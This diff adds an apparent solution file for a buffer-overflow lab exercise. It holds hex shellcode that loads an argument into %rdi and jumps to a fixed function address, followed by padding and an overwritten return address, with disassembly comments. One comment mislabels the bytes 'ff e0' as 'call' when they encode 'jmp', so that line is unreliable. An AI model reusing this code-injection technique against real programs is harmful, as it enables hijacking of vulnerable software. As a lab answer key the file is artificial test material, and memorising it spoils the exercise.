@@ -1,0 +1,14 @@
+48 c7 c0 00 00 00 00 
+48 8b b8 e4 44 60 00
+48 c7 c0 ec 17 40 00
+ff e0
+ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00
+
+
+ /* 48 c7 c0 00 00 00 00       mov    $0x0,%rax           */
+ /* 48 8b b8 e4 44 60 00       mov    0x6044e4(%rax),%rdi */
+ /* 48 c7 c0 ec 17 40 00       mov    $0x4017ec,%rax      */
+ /* ff e0                      call   *%rax               */
